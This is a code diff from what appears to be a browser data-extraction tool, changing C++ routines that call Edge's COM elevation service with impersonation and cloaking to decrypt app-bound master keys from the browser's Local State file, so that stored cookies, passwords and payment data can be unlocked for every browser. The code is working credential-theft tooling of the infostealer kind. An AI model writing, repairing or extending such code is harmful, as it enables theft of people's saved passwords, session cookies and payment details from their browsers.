@@ -270,12 +270,25 @@ namespace SecurityComponents
         {
             Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
             hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
-            if (SUCCEEDED(hr))
+            if (FAILED(hr))
             {
-                CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 
-                                COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 
-                                RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
-                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
+                std::ostringstream oss;
+                oss << "CoCreateInstance failed for Edge. HRESULT: 0x" << std::hex << hr;
+                SysFreeString(bstrEncKey);
+                throw std::runtime_error(oss.str());
+            }
+            CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
+                            COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+                            RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
+            hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
+            if (FAILED(hr))
+            {
+                std::ostringstream oss;
+                oss << "DecryptData failed for Edge. HRESULT: 0x" << std::hex << hr
+                    << " comErr: 0x" << comErr;
+                SysFreeString(bstrEncKey);
+                if (bstrPlainKey) SysFreeString(bstrPlainKey);
+                throw std::runtime_error(oss.str());
             }
         }
         else
@@ -355,43 +368,33 @@ namespace SecurityComponents
     {
         m_logger.Log("[*] Reading Local State file: " + StringUtils::path_to_string(localStatePath));
         
-        // Edge passwords use DPAPI without process requirement
-        if (config.name == "Edge" && dataType == DataType::Passwords)
-        {
-            m_logger.Log("[*] Using DPAPI decryption for Edge passwords (no process required)");
-            auto aesKey = DecryptWithDPAPI(localStatePath);
-            m_logger.Log("[+] Edge DPAPI decryption successful for passwords");
-            return aesKey;
+        // All browsers (including Edge) use COM elevation for all data types.
+        // Modern Edge uses app_bound_encrypted_key (APPB) for cookies, passwords, and payments.
+        std::string dataTypeStr = "data";
+        switch (dataType) {
+            case DataType::Cookies:   dataTypeStr = "cookies";   break;
+            case DataType::Payments:  dataTypeStr = "payments";  break;
+            case DataType::Passwords: dataTypeStr = "passwords"; break;
+            default:                  dataTypeStr = "data";      break;
         }
-        else
-        {
-            // All other scenarios use COM elevation
-            std::string dataTypeStr = "data";
-            switch (dataType) {
-                case DataType::Cookies: dataTypeStr = "cookies"; break;
-                case DataType::Payments: dataTypeStr = "payments"; break;
-                case DataType::Passwords: dataTypeStr = "passwords"; break;
-                default: dataTypeStr = "data"; break;
-            }
-            
-            m_logger.Log("[*] Using COM elevation for " + config.name + " " + dataTypeStr);
-            
-            if (!m_comInitialized)
-            {
-                if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
-                {
-                    throw std::runtime_error("Failed to initialize COM library.");
-                }
-                m_comInitialized = true;
-                m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
-            }
 
-            auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);
-            m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
-            
-            auto aesKey = DecryptWithCOM(config, encryptedKeyBlob);
-            m_logger.Log("[+] " + config.name + " COM elevation decryption successful for " + dataTypeStr);
-            return aesKey;
+        m_logger.Log("[*] Using COM elevation for " + config.name + " " + dataTypeStr);
+
+        if (!m_comInitialized)
+        {
+            if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
+            {
+                throw std::runtime_error("Failed to initialize COM library.");
+            }
+            m_comInitialized = true;
+            m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
         }
+
+        auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);
+        m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
+
+        auto aesKey = DecryptWithCOM(config, encryptedKeyBlob);
+        m_logger.Log("[+] " + config.name + " COM elevation decryption successful for " + dataTypeStr);
+        return aesKey;
     }
 }
